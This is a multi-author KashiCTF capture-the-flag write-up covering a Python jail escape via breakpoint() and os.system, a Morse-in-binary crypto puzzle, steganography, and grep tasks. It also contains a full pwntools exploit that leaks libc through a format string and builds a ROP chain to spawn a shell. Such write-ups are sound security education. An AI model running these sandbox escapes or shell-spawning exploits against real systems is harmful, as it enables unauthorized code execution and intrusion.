# KashiCTF

# By bytecodesky

# Easy Jail 2 - Writeup

## Description
The challenge consists of escaping a Python sandbox (PyJail) to execute arbitrary system commands and read the flag.
## Analysis
The challenge environment restricts the execution of certain commands and modules. However, since we have an interactive Python session, we can look for ways to bypass these restrictions and execute arbitrary code.

## Exploitation
I discovered that the breakpoint() function could be used to access Python's interactive debugger. From there, it is possible to import modules like os and execute system commands.

The final exploit was:
```python
breakpoint()
import os; os.system("sh")
```
This gave us an interactive shell, allowing us to run:
```bash
cat /flag.txt
```
## Conclusion

Using `breakpoint()` allowed access to an interactive debugger, which enabled arbitrary command execution, making it possible to escape the sandbox and retrieve the flag.

# By m3tadr0id

# Lost Frequencies (CRYPTO)


### Description:

> Zeroes, ones, dots and dashes  
> Data streams in bright flashes

Given data:

```
111 0000 10 111 1000 00 10 01 010 1011 11 111 010 000 0
```

---

## Solution:

### Step 1: Recognizing the Pattern

The challenge hints at a connection between binary digits (0s and 1s) and Morse code due to the reference to "dots and dashes."

### Step 2: Interpreting the Data

Binary sequences like `111` and `0000` could represent Morse code elements:

- `1` can correspond to a dash (`-`)
- `0` can correspond to a dot (`.`)

Using this pattern, we attempted to decode the binary sequence into Morse code.

### Step 3: Decoding Morse Code

We used [dCode's Morse Code Decoder](https://www.dcode.fr/morse-code) to translate the extracted Morse code into readable text.

![Pasted image 20250224225632](./images/7724cc35-a1c6-4aa2-a9fd-fbd0f7d6309e.png)


`KashiCTF{OHNOBINARYMORSE}`


### Game 1 - Untitled Game (Reverse)

Running `strings` on the binary immediately revealed the flag:

![Pasted image 20250224230030](./images/bf6e4dc2-4298-42aa-8f30-a6d507b3b09f.png)

`KashiCTF{N07_1N_7H3_G4M3}`

### Look at Me (Dfir)

### Description:

> There is something wrong with him... What can it be??

We were given an image that reminded me of the software SilentEye, a tool used for steganography analysis.

### Solution:

Using SilentEye,  I analyzed the image and extracted hidden data. The decoded message revealed the flag:


![Pasted image 20250224230554](./images/361d39c5-939f-4d84-b09f-a1e8b59d74a7.png)


`KashiCTF{K33p_1t_re4l}`

# The Troll Zone

```py
from pwn import *
context.arch="amd64"
p=remote("kashictf.iitbhucybersec.in",65239)
libc=ELF("libc.so.6")
p.sendlineafter("? ","%17$p")
p.recvuntil("Lmao not giving you ")
libc.address=int(p.recvline(keepends=False),16) -0x2724a
print(f"{hex(libc.address)=}")
p.sendlineafter("at? ",b'a'*0x28+p64(0x0040123f)+p64(next(libc.search(asm('pop rdi; ret'), executable=True)))+p64(libc.search(b'/bin/sh').__next__())+p64(libc.sym['system']))
p.interactive()
```
# By `superman_.22`

- easy jail 1
    - `__import__('os').system('cat /flag.txt')`

![easyjail1.png](./images/easyjail1.png)

- `MemorieBringBackYou` and `Corruption`
    - Just grep

![corruption.png](./images/corruption.png)